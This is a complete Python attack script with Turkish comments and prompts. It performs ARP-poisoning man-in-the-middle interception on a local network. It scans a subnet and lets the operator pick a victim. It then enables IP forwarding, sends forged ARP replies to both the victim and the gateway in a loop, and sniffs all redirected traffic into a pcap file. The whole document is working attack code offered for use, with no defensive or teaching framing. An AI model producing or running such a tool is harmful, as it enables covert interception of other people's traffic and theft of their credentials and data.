#!/usr/bin/env python3

import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

# Çalışma dizinini al
cwd = os.getcwd()

def check_sudo_privileges():
    """Super kullanıcı yetkileriyle çalıştırılıp çalıştırılmadığını kontrol et."""
    if 'SUDO_UID' not in os.environ:
        print("Bu programı sudo ile çalıştırmalısınız.")
        exit()

def arp_scan(ip_range):
    """Ağ aralığını tarayarak ARP yanıtlarını döndür."""
    arp_responses = []
    answered_list = scapy.arping(ip_range, verbose=0)[0]
    for response in answered_list:
        arp_responses.append({"ip": response[1].psrc, "mac": response[1].hwsrc})
    return arp_responses

def is_gateway(gateway_ip):
    """Gateway IP'sini route -n komutundan kontrol et."""
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    for row in result:
        if gateway_ip in row:
            return True
    return False

def get_interface_names():
    """Ağ arayüzü isimlerini döndür."""
    os.chdir("/sys/class/net")
    return os.listdir()

def match_iface_name(row):
    """Arayüz ismini bul."""
    interface_names = get_interface_names()
    for iface in interface_names:
        if iface in row:
            return iface

def gateway_info(network_info):
    """Gateway bilgilerini al."""
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    gateways = []
    for device in network_info:
        for row in result:
            if device["ip"] in row:
                iface_name = match_iface_name(row)
                gateways.append({"iface": iface_name, "ip": device["ip"], "mac": device["mac"]})
    return gateways

def clients(arp_res, gateway_res):
    """Gateway hariç istemci listesini döndür."""
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            if gateway["ip"] != item["ip"]:
                client_list.append(item)
    return client_list

def enable_ip_forwarding():
    """IP yönlendirmesini etkinleştir."""
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])

def arp_spoofer(target_ip, target_mac, spoof_ip):
    """ARP tablosunu güncellemek için sahte ARP paketi gönder."""
    pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)

def send_spoof_packets():
    """Sürekli sahte ARP paketleri gönder."""
    while True:
        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
        time.sleep(3)

def packet_sniffer(interface):
    """Ağ trafiğini dinle ve paketleri yakala."""
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_pkt)

def process_sniffed_pkt(pkt):
    """Yakalanan paketleri pcap dosyasına yaz."""
    print("Paketler pcap dosyasına yazılıyor. Çıkmak için Ctrl + C tuşlayın.")
    scapy.wrpcap("requests.pcap", pkt, append=True)

def print_arp_res(arp_res):
    """İstemci listesini menü olarak göster ve seçim al."""
    print(r"""
  ____                  _               _             
 / ___|  ___  _ __ ___ (_) ___  _ __   (_) ___  _ __  
 \___ \ / _ \| '_ ` _ \| |/ _ \| '_ \  | |/ _ \| '_ \ 
  ___) | (_) | | | | | | | (_) | | | | | | (_) | | | |
 |____/ \___/|_| |_| |_|_|\___/|_| |_|_|_|\___/|_| |_|""")
    print("\n****************************************************************")
    print("ID\t\tIP\t\t\tMAC Adresi")
    print("_________________________________________________________")
    for id, res in enumerate(arp_res):
        print("{}\t\t{}\t\t{}".format(id, res['ip'], res['mac']))
    while True:
        try:
            choice = int(input("Lütfen ARP tablosunu zehirlemek istediğiniz bilgisayarın ID'sini seçin (çıkmak için Ctrl+Z): "))
            if 0 <= choice < len(arp_res):
                return choice
        except ValueError:
            print("Lütfen geçerli bir ID girin!")

def get_cmd_arguments():
    """Komut satırı argümanlarını doğrula."""
    ip_range = None
    if len(sys.argv) > 1 and sys.argv[1] != "-ip_range":
        print("-ip_range bayrağı belirtilmedi.")
        return ip_range
    elif len(sys.argv) > 2 and sys.argv[1] == "-ip_range":
        try:
            IPv4Network(sys.argv[2])
            ip_range = sys.argv[2]
            print("Geçerli IP aralığı komut satırından girildi.")
        except ValueError:
            print("Geçersiz komut satırı argümanı.")
    return ip_range

# Süper kullanıcı yetkilerini kontrol et
check_sudo_privileges()

# Komut satırı argümanlarından IP aralığını al
ip_range = get_cmd_arguments()

# Geçerli IP aralığı yoksa çık
if ip_range is None:
    print("Geçerli bir IP aralığı belirtilmedi. Çıkılıyor!")
    exit()

# IP yönlendirmesini etkinleştir
enable_ip_forwarding()

# ARP taraması yap
arp_res = arp_scan(ip_range)

# Bağlantı yoksa çık
if len(arp_res) == 0:
    print("Bağlantı yok. Cihazların aktif olduğundan emin olun. Çıkılıyor!")
    exit()

# Gateway bilgilerini al
gateways = gateway_info(arp_res)
gateway_info = gateways[0]

# İstemci listesini al
client_info = clients(arp_res, gateways)

# İstemci yoksa çık
if len(client_info) == 0:
    print("İstemci bulunamadı. Cihazların aktif olduğundan emin olun. Çıkılıyor!")
    exit()

# İstemci menüsünü göster ve seçim al
choice = print_arp_res(client_info)
node_to_spoof = client_info[choice]

# Sahte ARP paketleri gönderen thread'i başlat
t1 = threading.Thread(target=send_spoof_packets, daemon=True)
t1.start()

# Çalışma dizinine geri dön
os.chdir(cwd)

# Paketleri dinle
packet_sniffer(gateway_info["iface"])
